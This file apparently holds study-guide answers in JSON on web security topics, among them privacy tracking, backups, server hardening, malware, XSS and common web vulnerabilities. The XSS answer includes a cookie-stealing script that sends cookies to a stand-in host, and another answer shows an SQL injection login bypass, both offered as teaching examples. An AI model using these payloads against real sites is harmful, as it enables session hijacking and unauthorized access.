@@ -1,0 +1,661 @@
+{
+    "descriptives": [
+        {
+            "question": "1.c Describe how modern web technologies compromise user privacy.",
+            "topic": "Web Security",
+            "answer": [
+                {
+                    "type": "heading",
+                    "content": "Modern Web Technologies and User Privacy Compromise"
+                },
+                {
+                    "type": "text",
+                    "content": "While modern web technologies have enabled powerful digital experiences, they have also created an expansive surveillance infrastructure that continuously monitors, profiles, and exploits user data — often without meaningful consent or awareness."
+                },
+                {
+                    "type": "subheading",
+                    "content": "1. Continuous Data Collection"
+                },
+                {
+                    "type": "text",
+                    "content": "Websites and apps constantly collect user data — search queries, click patterns, scroll behavior, time spent on pages, device information, and location data. Companies like Google and Meta process billions of data points daily to build comprehensive digital profiles of users. Even 'free' services monetize user data through targeted advertising."
+                },
+                {
+                    "type": "subheading",
+                    "content": "2. Tracking Cookies"
+                },
+                {
+                    "type": "text",
+                    "content": "Cookies are small data files stored in the user's browser. While first-party cookies enable session management and preferences, third-party cookies allow advertisers to track users across multiple websites. A user visiting a shopping site may be followed by product ads across dozens of unrelated websites — all powered by tracking cookies from ad networks like Google Ads and Facebook Pixel."
+                },
+                {
+                    "type": "subheading",
+                    "content": "3. Browser Fingerprinting"
+                },
+                {
+                    "type": "text",
+                    "content": "Browser fingerprinting creates a unique identity for each user based on their device's characteristics — screen resolution, installed fonts, browser plugins, GPU model, timezone, and language settings. Unlike cookies, fingerprints cannot be cleared by users, making this a persistent and invisible tracking method that works even in private browsing mode."
+                },
+                {
+                    "type": "callout",
+                    "content": "Research shows that browser fingerprints can uniquely identify over 94% of users — even without cookies or login data.",
+                    "label": "Key Statistic"
+                },
+                {
+                    "type": "subheading",
+                    "content": "4. Tracking Pixels"
+                },
+                {
+                    "type": "text",
+                    "content": "Tracking pixels are invisible 1x1 pixel images embedded in web pages or emails. When loaded, they send information back to the server — confirming that a user opened an email, visited a page, or completed an action. They are widely used in email marketing and website analytics to monitor user behavior without any visible indication."
+                },
+                {
+                    "type": "subheading",
+                    "content": "5. Social Media Surveillance"
+                },
+                {
+                    "type": "text",
+                    "content": "Social media platforms track everything — likes, shares, comments, time spent viewing posts, friend connections, group memberships, and even messages. This data is used to build detailed behavioral profiles for targeted advertising. Social login buttons ('Login with Facebook/Google') on third-party websites extend tracking beyond the platform itself."
+                },
+                {
+                    "type": "subheading",
+                    "content": "6. Third-Party Trackers and Data Brokers"
+                },
+                {
+                    "type": "text",
+                    "content": "Third-party tracking scripts embedded across thousands of websites collect browsing data, purchase history, and demographic information. Data brokers like Acxiom, Oracle Data Cloud, and Experian aggregate this data from multiple sources, create comprehensive user profiles, and sell them to advertisers, insurers, and even political campaigns."
+                },
+                {
+                    "type": "subheading",
+                    "content": "7. Government and ISP Surveillance"
+                },
+                {
+                    "type": "text",
+                    "content": "Internet Service Providers (ISPs) can monitor all unencrypted internet traffic — every website visited, every search query made. Government surveillance programs (such as NSA's PRISM) collect communication data at scale. Without encryption, user communications are exposed to interception by ISPs, governments, and malicious actors."
+                },
+                {
+                    "type": "subheading",
+                    "content": "8. Consequences of Privacy Loss"
+                },
+                {
+                    "type": "list",
+                    "items": [
+                        "Behavioral profiling enables manipulation of user decisions (purchases, votes, opinions)",
+                        "Identity theft and financial fraud from stolen personal information",
+                        "Discriminatory pricing — showing different prices based on user profiles",
+                        "Chilling effect — self-censorship when users know they're being watched",
+                        "Data breaches expose sensitive personal information to criminals"
+                    ]
+                }
+            ]
+        },
+        {
+            "question": "2.c Explain the privacy-protecting techniques used on the web.",
+            "topic": "Web Security",
+            "answer": [
+                {
+                    "type": "heading",
+                    "content": "Privacy-Protecting Techniques Used on the Web"
+                },
+                {
+                    "type": "text",
+                    "content": "As online tracking and surveillance have grown, numerous privacy-protecting tools and techniques have emerged to help users safeguard their data, identity, and communications on the web."
+                },
+                {
+                    "type": "subheading",
+                    "content": "1. Private Browsing Mode"
+                },
+                {
+                    "type": "text",
+                    "content": "Private/incognito mode prevents the browser from saving browsing history, cookies, form data, and cached files locally after the session ends. However, it does not hide activity from ISPs, employers, or websites — it only protects against local device snooping."
+                },
+                {
+                    "type": "subheading",
+                    "content": "2. Privacy-Focused Browsers"
+                },
+                {
+                    "type": "text",
+                    "content": "Browsers like Brave, Tor Browser, and Firefox with Enhanced Tracking Protection block third-party trackers, disable fingerprinting techniques, and reduce data collection by default. Tor Browser routes traffic through multiple encrypted nodes, making it extremely difficult to trace user activity."
+                },
+                {
+                    "type": "subheading",
+                    "content": "3. Browser Extensions"
+                },
+                {
+                    "type": "text",
+                    "content": "Extensions like uBlock Origin (ad/tracker blocker), Privacy Badger (intelligent tracker blocking), HTTPS Everywhere (forces encrypted connections), and NoScript (blocks JavaScript execution) give users granular control over what runs in their browser and what data is shared."
+                },
+                {
+                    "type": "subheading",
+                    "content": "4. Virtual Private Networks (VPNs)"
+                },
+                {
+                    "type": "text",
+                    "content": "VPNs encrypt all internet traffic between the user's device and the VPN server, hiding browsing activity from ISPs and network administrators. They also mask the user's real IP address, making location-based tracking ineffective. Trusted VPN providers include Mullvad, ProtonVPN, and NordVPN."
+                },
+                {
+                    "type": "callout",
+                    "content": "A VPN protects data in transit, but the VPN provider itself can see your traffic — choose a provider with a verified no-logs policy.",
+                    "label": "Important"
+                },
+                {
+                    "type": "subheading",
+                    "content": "5. DNS Security (DoH / DoT)"
+                },
+                {
+                    "type": "text",
+                    "content": "DNS-over-HTTPS (DoH) and DNS-over-TLS (DoT) encrypt DNS queries, preventing ISPs and network observers from seeing which websites a user is visiting. Without DNS encryption, every website lookup is visible in plain text to anyone monitoring the network."
+                },
+                {
+                    "type": "subheading",
+                    "content": "6. HTTPS Encryption"
+                },
+                {
+                    "type": "text",
+                    "content": "HTTPS (HTTP over TLS/SSL) encrypts all data transmitted between the browser and the web server — login credentials, personal information, payment details, and browsing content. Modern browsers now warn users when visiting non-HTTPS sites, and over 95% of web traffic is encrypted with HTTPS."
+                },
+                {
+                    "type": "subheading",
+                    "content": "7. End-to-End Encryption (E2EE)"
+                },
+                {
+                    "type": "text",
+                    "content": "End-to-end encryption ensures that only the communicating parties can read messages — not even the service provider. Apps like Signal, WhatsApp, and ProtonMail use E2EE to protect messages, calls, and emails from interception by intermediaries, hackers, or governments."
+                },
+                {
+                    "type": "subheading",
+                    "content": "8. Strong Passwords and Two-Factor Authentication (2FA)"
+                },
+                {
+                    "type": "text",
+                    "content": "Strong, unique passwords combined with 2FA (via authenticator apps, SMS codes, or hardware keys like YubiKey) prevent unauthorized account access even if passwords are compromised. Password managers like Bitwarden and 1Password generate and store complex passwords securely."
+                }
+            ]
+        },
+        {
+            "question": "3.c Describe backup strategies for data protection.",
+            "topic": "Web Security",
+            "answer": [
+                {
+                    "type": "heading",
+                    "content": "Backup Strategies for Data Protection"
+                },
+                {
+                    "type": "text",
+                    "content": "Data backups are a critical component of any security and disaster recovery plan. A well-designed backup strategy ensures data can be recovered quickly after hardware failures, cyberattacks (ransomware), accidental deletion, or natural disasters."
+                },
+                {
+                    "type": "subheading",
+                    "content": "1. Full Backup"
+                },
+                {
+                    "type": "text",
+                    "content": "A full backup creates a complete copy of all data at a specific point in time. It is the simplest backup type — restoration is straightforward since everything is in one backup set. However, full backups require the most storage space and take the longest to complete, making them impractical to run daily for large datasets."
+                },
+                {
+                    "type": "list",
+                    "items": [
+                        "Advantage: Simplest restoration — just restore the single backup set",
+                        "Disadvantage: Requires maximum storage space and backup time",
+                        "Typical frequency: Weekly or monthly"
+                    ]
+                },
+                {
+                    "type": "subheading",
+                    "content": "2. Incremental Backup"
+                },
+                {
+                    "type": "text",
+                    "content": "An incremental backup copies only the data that has changed since the last backup (full or incremental). This makes each backup fast and storage-efficient. However, restoration requires the last full backup plus every subsequent incremental backup in sequence, which increases complexity and recovery time."
+                },
+                {
+                    "type": "list",
+                    "items": [
+                        "Advantage: Fastest backup time, minimal storage usage",
+                        "Disadvantage: Slower restoration — requires full + all incrementals in order",
+                        "Typical frequency: Daily"
+                    ]
+                },
+                {
+                    "type": "subheading",
+                    "content": "3. Differential Backup"
+                },
+                {
+                    "type": "text",
+                    "content": "A differential backup copies all data that has changed since the last full backup. It is a middle ground between full and incremental — faster to restore than incremental (only needs the last full + latest differential) but uses more storage than incremental backups as the differential grows larger each day."
+                },
+                {
+                    "type": "list",
+                    "items": [
+                        "Advantage: Faster restoration than incremental — only needs full + latest differential",
+                        "Disadvantage: Growing backup size as more changes accumulate since last full backup",
+                        "Typical frequency: Daily, with weekly full backups"
+                    ]
+                },
+                {
+                    "type": "subheading",
+                    "content": "4. Cloud / Offsite Backup"
+                },
+                {
+                    "type": "text",
+                    "content": "Cloud backups store data at remote locations using services like AWS S3, Google Cloud Storage, Azure Backup, or Backblaze. Offsite backups protect against local disasters (fire, flood, theft) that would destroy on-premises backups. Cloud providers offer automatic replication across geographic regions for high durability."
+                },
+                {
+                    "type": "subheading",
+                    "content": "5. Backup Best Practices"
+                },
+                {
+                    "type": "list",
+                    "items": [
+                        "3-2-1 Rule: Keep 3 copies of data, on 2 different media types, with 1 copy offsite",
+                        "Automate backups on a regular schedule to eliminate human error",
+                        "Test restoration regularly — a backup is only useful if it can be restored",
+                        "Encrypt backups to protect data confidentiality in transit and at rest",
+                        "Monitor backup jobs and alert on failures immediately"
+                    ]
+                },
+                {
+                    "type": "callout",
+                    "content": "The 3-2-1 backup strategy is the industry gold standard — it protects against single points of failure, local disasters, and ransomware attacks that encrypt both primary data and connected backup drives.",
+                    "label": "Industry Standard"
+                }
+            ]
+        },
+        {
+            "question": "4.c Discuss physical security for servers.",
+            "topic": "Web Security",
+            "answer": [
+                {
+                    "type": "heading",
+                    "content": "Physical Security for Servers"
+                },
+                {
+                    "type": "text",
+                    "content": "Physical security protects server hardware and infrastructure from unauthorized access, theft, tampering, and environmental threats. Even the strongest software security is meaningless if an attacker can physically access the server and extract data directly from the drives."
+                },
+                {
+                    "type": "subheading",
+                    "content": "1. Access Control Measures"
+                },
+                {
+                    "type": "text",
+                    "content": "Server rooms must restrict physical access to authorized personnel only. Multi-layered access controls include electronic keycards, biometric systems (fingerprint, retina scan), PIN codes, and mantrap doors (double-door systems where the first door must close before the second opens). Visitor access should require escort and be logged."
+                },
+                {
+                    "type": "subheading",
+                    "content": "2. Surveillance Systems"
+                },
+                {
+                    "type": "text",
+                    "content": "CCTV cameras monitor server rooms, entry/exit points, and surrounding areas 24/7. Recorded footage provides evidence for security audits and incident investigations. Motion sensors and intrusion detection alarms trigger immediate alerts when unauthorized movement is detected in restricted zones."
+                },
+                {
+                    "type": "subheading",
+                    "content": "3. Environmental Controls"
+                },
+                {
+                    "type": "text",
+                    "content": "Servers generate significant heat and are sensitive to environmental conditions. Data centers maintain precise temperature (18-27°C) and humidity (40-60%) using dedicated HVAC systems. Fire suppression systems use clean agents (FM-200, Novec) that extinguish fires without damaging equipment — unlike water sprinklers."
+                },
+                {
+                    "type": "subheading",
+                    "content": "4. Power Protection"
+                },
+                {
+                    "type": "text",
+                    "content": "Uninterruptible Power Supply (UPS) systems provide immediate battery backup during power outages, protecting against sudden shutdowns that can corrupt data. Backup generators ensure extended operation during prolonged outages. Redundant power feeds from separate utility grids eliminate single points of failure."
+                },
+                {
+                    "type": "subheading",
+                    "content": "5. Best Practices"
+                },
+                {
+                    "type": "list",
+                    "items": [
+                        "Maintain detailed access logs — who entered, when, and for how long",
+                        "Implement redundancy for all critical infrastructure (power, cooling, networking)",
+                        "Conduct regular physical security audits and penetration tests",
+                        "Establish and practice incident response plans for breach scenarios",
+                        "Secure cable management to prevent accidental disconnection or tampering"
+                    ]
+                },
+                {
+                    "type": "callout",
+                    "content": "Physical security is the foundation of all security — if an attacker gains physical access to a server, all software-level protections (firewalls, encryption, authentication) can potentially be bypassed.",
+                    "label": "Fundamental Principle"
+                }
+            ]
+        },
+        {
+            "question": "4.d Describe technical controls for securing web servers.",
+            "topic": "Web Security",
+            "answer": [
+                {
+                    "type": "heading",
+                    "content": "Technical Controls for Securing Web Servers"
+                },
+                {
+                    "type": "text",
+                    "content": "Technical controls are software and configuration-based security measures that protect web servers from cyber threats, unauthorized access, and data breaches. They form the primary defense layer against remote attacks."
+                },
+                {
+                    "type": "subheading",
+                    "content": "1. Firewalls and IDS/IPS"
+                },
+                {
+                    "type": "text",
+                    "content": "Firewalls filter incoming and outgoing network traffic based on predefined security rules, blocking unauthorized access while allowing legitimate traffic. Intrusion Detection Systems (IDS) monitor traffic for suspicious patterns and alert administrators. Intrusion Prevention Systems (IPS) go further by automatically blocking detected threats in real time."
+                },
+                {
+                    "type": "subheading",
+                    "content": "2. Regular Patching and Updates"
+                },
+                {
+                    "type": "text",
+                    "content": "Keeping the operating system, web server software (Apache, Nginx), databases, and application frameworks updated with the latest security patches is critical. Known vulnerabilities in outdated software are the most common attack vector — attackers actively scan for unpatched servers using automated tools."
+                },
+                {
+                    "type": "subheading",
+                    "content": "3. Secure Configuration and Hardening"
+                },
+                {
+                    "type": "text",
+                    "content": "Server hardening involves disabling all unnecessary services, ports, and default accounts. This minimizes the attack surface — the fewer services running, the fewer potential entry points for attackers. Directory listing should be disabled, default error pages should be customized, and server version headers should be hidden."
+                },
+                {
+                    "type": "subheading",
+                    "content": "4. Access Control Mechanisms"
+                },
+                {
+                    "type": "text",
+                    "content": "Enforce strong authentication (multi-factor where possible) and the principle of least privilege — each user and service account should have only the minimum permissions needed. Use SSH keys instead of passwords for server access, disable root login, and implement IP whitelisting for administrative interfaces."
+                },
+                {
+                    "type": "subheading",
+                    "content": "5. Logging and Monitoring"
+                },
+                {
+                    "type": "text",
+                    "content": "Comprehensive logging records all server activities — access attempts, errors, configuration changes, and security events. Centralized log management tools (ELK Stack, Splunk) aggregate logs for analysis. Real-time monitoring and alerting detect anomalies and potential breaches early, enabling rapid incident response."
+                },
+                {
+                    "type": "callout",
+                    "content": "Defense in depth — layering multiple technical controls ensures that if one control fails, others continue to protect the server. No single control is sufficient on its own.",
+                    "label": "Security Principle"
+                }
+            ]
+        },
+        {
+            "question": "5.c Explain about the malware in the web attacks.",
+            "topic": "Web Security",
+            "answer": [
+                {
+                    "type": "heading",
+                    "content": "Malware in Web Attacks"
+                },
+                {
+                    "type": "text",
+                    "content": "Malware (malicious software) is any software intentionally designed to cause damage, steal data, or gain unauthorized access to systems. In web attacks, malware is a primary tool used by attackers to compromise servers, infect users, and disrupt services."
+                },
+                {
+                    "type": "subheading",
+                    "content": "Types of Web Malware"
+                },
+                {
+                    "type": "list",
+                    "items": [
+                        "Viruses – Self-replicating programs that attach to legitimate files and spread when executed",
+                        "Worms – Self-propagating malware that spreads across networks without user interaction",
+                        "Trojans – Malware disguised as legitimate software that creates backdoors for attackers",
+                        "Ransomware – Encrypts files or entire systems and demands payment for decryption keys",
+                        "Spyware – Silently monitors user activity, captures keystrokes, and steals credentials",
+                        "Web Shells – Malicious scripts uploaded to servers that provide persistent remote access"
+                    ]
+                },
+                {
+                    "type": "subheading",
+                    "content": "How Malware Enters Web Systems"
+                },
+                {
+                    "type": "text",
+                    "content": "Malware typically infiltrates web servers through vulnerable file upload forms that don't validate file types, outdated software with known security vulnerabilities, compromised third-party plugins or themes (especially in CMS platforms like WordPress), phishing attacks that trick administrators into installing malicious code, and SQL injection attacks that write malicious files to the server."
+                },
+                {
+                    "type": "subheading",
+                    "content": "Impact of Malware on Web Applications"
+                },
+                {
+                    "type": "list",
+                    "items": [
+                        "Backdoor access – Attackers gain persistent remote control of the server",
+                        "Data theft – Sensitive user data (credentials, payment info) is exfiltrated",
+                        "Ransomware encryption – Website data and databases are encrypted, demanding payment",
+                        "SEO spam injection – Malware injects hidden links to boost attacker's websites in search rankings",
+                        "DDoS participation – Infected servers become part of botnets used for distributed attacks",
+                        "Defacement – Website content is replaced with attacker's messages"
+                    ]
+                },
+                {
+                    "type": "subheading",
+                    "content": "Prevention Measures"
+                },
+                {
+                    "type": "list",
+                    "items": [
+                        "Keep all software, plugins, and dependencies updated with security patches",
+                        "Validate and sanitize all file uploads — restrict allowed file types and scan for malware",
+                        "Use Web Application Firewalls (WAF) to block malicious requests",
+                        "Install and regularly update server-side antivirus and malware scanners",
+                        "Implement the principle of least privilege for all server accounts and processes"
+                    ]
+                }
+            ]
+        },
+        {
+            "question": "5.d Describe the host-based security mechanisms.",
+            "topic": "Web Security",
+            "answer": [
+                {
+                    "type": "heading",
+                    "content": "Host-Based Security Mechanisms"
+                },
+                {
+                    "type": "text",
+                    "content": "Host-based security focuses on protecting individual servers and endpoints (the 'hosts') rather than the network perimeter. These mechanisms run directly on the server and provide the last line of defense against attacks that bypass network-level protections."
+                },
+                {
+                    "type": "subheading",
+                    "content": "1. Operating System Hardening"
+                },
+                {
+                    "type": "text",
+                    "content": "OS hardening reduces the attack surface by removing or disabling all unnecessary services, protocols, ports, and default accounts. Only essential software should be installed. File permissions should follow the principle of least privilege, and security-enhanced kernels (like SELinux for Linux) enforce mandatory access controls beyond standard permissions."
+                },
+                {
+                    "type": "subheading",
+                    "content": "2. Patch Management"
+                },
+                {
+                    "type": "text",
+                    "content": "A systematic patch management process ensures the OS, web server, runtime environments, and all installed software are kept up-to-date with the latest security patches. Automated patch management tools (WSUS for Windows, unattended-upgrades for Linux) reduce the window of vulnerability exposure."
+                },
+                {
+                    "type": "subheading",
+                    "content": "3. User Account Management"
+                },
+                {
+                    "type": "text",
+                    "content": "Strong authentication policies enforce complex passwords, account lockout after failed attempts, and multi-factor authentication for privileged accounts. The principle of least privilege ensures each user and service account has only the minimum permissions needed. Shared accounts should be eliminated, and inactive accounts should be disabled."
+                },
+                {
+                    "type": "subheading",
+                    "content": "4. Antivirus and Anti-Malware Protection"
+                },
+                {
+                    "type": "text",
+                    "content": "Host-based antivirus software provides real-time scanning of files, processes, and network connections for known malware signatures and suspicious behaviors. Modern solutions use heuristic and behavioral analysis to detect zero-day threats that signature-based detection would miss."
+                },
+                {
+                    "type": "subheading",
+                    "content": "5. Logging and Auditing"
+                },
+                {
+                    "type": "text",
+                    "content": "Comprehensive logging of system events, user activities, authentication attempts, file access, and configuration changes creates an audit trail for detecting unauthorized access and investigating security incidents. Logs should be forwarded to a centralized, tamper-proof logging server to prevent attackers from deleting evidence."
+                },
+                {
+                    "type": "callout",
+                    "content": "Host-based security complements network security — firewalls protect the perimeter, but host-based controls protect the server itself when attackers breach the perimeter or attack from within.",
+                    "label": "Defense in Depth"
+                }
+            ]
+        },
+        {
+            "question": "6.c Discuss Cross-Site Scripting (XSS).",
+            "topic": "Web Security",
+            "answer": [
+                {
+                    "type": "heading",
+                    "content": "Cross-Site Scripting (XSS)"
+                },
+                {
+                    "type": "text",
+                    "content": "Cross-Site Scripting (XSS) is one of the most prevalent web application vulnerabilities. It occurs when an attacker injects malicious client-side scripts (usually JavaScript) into web pages that are then viewed by other users. The injected script executes in the victim's browser with the same privileges as the legitimate website."
+                },
+                {
+                    "type": "subheading",
+                    "content": "How XSS Works"
+                },
+                {
+                    "type": "text",
+                    "content": "An attacker finds an input field (search box, comment form, URL parameter) where user input is reflected back to the page without proper sanitization. They inject a malicious script that, when the page loads for another user, executes in that user's browser — stealing cookies, session tokens, or redirecting to phishing pages."
+                },
+                {
+                    "type": "code",
+                    "content": "<!-- Example: Malicious script in a comment field -->\n<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>\n\n<!-- When another user views this comment, their cookies are sent to the attacker -->"
+                },
+                {
+                    "type": "subheading",
+                    "content": "Types of XSS"
+                },
+                {
+                    "type": "text",
+                    "content": "1. Stored (Persistent) XSS — The malicious script is permanently stored on the target server (in a database, comment, or forum post). Every user who views the affected page is impacted. This is the most dangerous type."
+                },
+                {
+                    "type": "text",
+                    "content": "2. Reflected XSS — The malicious script is embedded in a URL or request parameter and reflected back in the server's response. The victim must click a crafted malicious link for the attack to execute."
+                },
+                {
+                    "type": "text",
+                    "content": "3. DOM-Based XSS — The vulnerability exists in client-side JavaScript code that processes user input and modifies the page DOM (Document Object Model) without server involvement. The attack payload never reaches the server."
+                },
+                {
+                    "type": "subheading",
+                    "content": "Impact of XSS"
+                },
+                {
+                    "type": "list",
+                    "items": [
+                        "Session hijacking — stealing session cookies to impersonate the user",
+                        "Credential theft — capturing login forms or keystrokes",
+                        "Phishing — redirecting users to fake login pages",
+                        "Malware distribution — injecting scripts that download malware",
+                        "Website defacement — altering page content visible to users"
+                    ]
+                },
+                {
+                    "type": "subheading",
+                    "content": "Prevention"
+                },
+                {
+                    "type": "list",
+                    "items": [
+                        "Input validation — sanitize and validate all user inputs on both client and server side",
+                        "Output encoding — encode special characters (< > \" ' &) before rendering in HTML",
+                        "Content Security Policy (CSP) — HTTP header that restricts which scripts can execute",
+                        "Use framework-provided escaping (React's JSX auto-escaping, Django's template escaping)",
+                        "HttpOnly cookies — prevent JavaScript from accessing session cookies"
+                    ]
+                }
+            ]
+        },
+        {
+            "question": "6.d Describe the web application vulnerabilities.",
+            "topic": "Web Security",
+            "answer": [
+                {
+                    "type": "heading",
+                    "content": "Web Application Vulnerabilities"
+                },
+                {
+                    "type": "text",
+                    "content": "Web applications are frequent targets for cyberattacks due to their public accessibility and the sensitive data they handle. The following are the most critical and commonly exploited web application vulnerabilities."
+                },
+                {
+                    "type": "subheading",
+                    "content": "1. SQL Injection (SQLi)"
+                },
+                {
+                    "type": "text",
+                    "content": "SQL Injection occurs when attackers insert malicious SQL code into input fields that are directly used in database queries. This can allow attackers to read, modify, or delete entire databases, bypass authentication, and even execute operating system commands on the database server."
+                },
+                {
+                    "type": "code",
+                    "content": "-- Vulnerable query\nSELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1'\n-- The OR '1'='1' always evaluates to true, bypassing authentication"
+                },
+                {
+                    "type": "subheading",
+                    "content": "2. Cross-Site Scripting (XSS)"
+                },
+                {
+                    "type": "text",
+                    "content": "XSS attacks inject malicious JavaScript into web pages viewed by other users. The injected scripts execute in victims' browsers, enabling attackers to steal session cookies, capture credentials, redirect users to malicious sites, and modify page content. XSS exists in three forms: stored, reflected, and DOM-based."
+                },
+                {
+                    "type": "subheading",
+                    "content": "3. Cross-Site Request Forgery (CSRF)"
+                },
+                {
+                    "type": "text",
+                    "content": "CSRF exploits the trust a website has in the user's browser. When a user is authenticated to a website (e.g., their bank), an attacker tricks them into clicking a malicious link that performs unauthorized actions (transferring money, changing email) using the user's active session — without the user's knowledge or consent."
+                },
+                {
+                    "type": "subheading",
+                    "content": "4. Broken Authentication"
+                },
+                {
+                    "type": "text",
+                    "content": "Broken authentication vulnerabilities allow attackers to compromise user accounts due to weak login mechanisms — predictable passwords, missing brute-force protection, insecure session management (session IDs in URLs, no session expiration), improper password storage (plain text or weak hashing), and missing multi-factor authentication."
+                },
+                {
+                    "type": "subheading",
+                    "content": "5. Insecure Direct Object References (IDOR)"
+                },
+                {
+                    "type": "text",
+                    "content": "IDOR occurs when an application exposes internal database IDs or file paths in URLs or API parameters without proper authorization checks. An attacker can simply change the ID value (e.g., /invoice/1234 → /invoice/1235) to access other users' data — invoices, profiles, medical records, or financial information."
+                },
+                {
+                    "type": "subheading",
+                    "content": "Prevention Best Practices"
+                },
+                {
+                    "type": "list",
+                    "items": [
+                        "Use parameterized queries (prepared statements) to prevent SQL Injection",
+                        "Sanitize and encode all user inputs to prevent XSS",
+                        "Implement anti-CSRF tokens for all state-changing requests",
+                        "Use strong session management with secure, HttpOnly, SameSite cookies",
+                        "Enforce proper authorization checks for every data access — never rely on obscurity"
+                    ]
+                },
+                {
+                    "type": "callout",
+                    "content": "The OWASP Top 10 is the industry-standard reference for the most critical web application security risks. It is updated regularly and should be mandatory reading for all web developers.",
+                    "label": "Reference"
+                }
+            ]
+        }
+    ]
+}
